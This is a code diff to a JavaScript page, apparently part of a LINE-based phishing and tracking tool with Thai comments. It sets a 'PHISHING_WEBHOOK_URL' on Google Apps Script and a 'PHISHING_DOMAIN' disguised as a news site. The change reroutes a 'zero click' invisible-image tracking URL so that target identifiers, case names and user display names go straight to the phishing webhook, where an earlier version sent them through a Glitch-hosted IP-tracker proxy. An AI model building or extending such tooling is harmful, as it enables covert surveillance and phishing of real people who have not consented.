@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyX7iV3KmfFYj3B77aEdFnFSY32bQVuZIVlEt_F6_mwCf6863OP8aHZ6IIgy6Hk1JbTUg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyCP9G1oMcmThZZdvr7JY0alrNw8eod8r9MBN0cKSiU-AwNTzLvTldOeg_rkUTMI6_b/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -823,19 +823,15 @@
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // ใช้ IMAGE PROXY เพื่อรับข้อมูลของเป้าหมายอย่างสมบูรณ์
-                // สร้าง URL ที่ผ่านตัวกลาง (proxy) แทนการเรียก Google Apps Script โดยตรง
-                const proxyBase = "https://ip-info-tracker.glitch.me/pixel.png"; // ใช้ Glitch.com เป็น proxy server
-                
                 // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                let zeroClickTrackUrl = `${proxyBase}?`;
-                zeroClickTrackUrl += `tracking_key=${trackingKey}`;
-                zeroClickTrackUrl += `&case_name=${encodeURIComponent(caseName)}`;
-                zeroClickTrackUrl += `&creator_id=${encodeURIComponent(userId)}`;
-                zeroClickTrackUrl += `&creator_name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&endpoint=${encodeURIComponent(PHISHING_WEBHOOK_URL)}`;  // ส่งข้อมูลไปยัง webhook หลังจากเก็บข้อมูลแล้ว
-                zeroClickTrackUrl += `&target=true`;  // ระบุว่านี่เป็นการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&nocache=${randomSuffix}`;  // ป้องกันการแคช
+                // ใช้เป็นพารามิเตอร์ในการโหลดภาพเล็กๆ ที่มองไม่เห็น
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
+                zeroClickTrackUrl += `&key=${trackingKey}`;
+                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
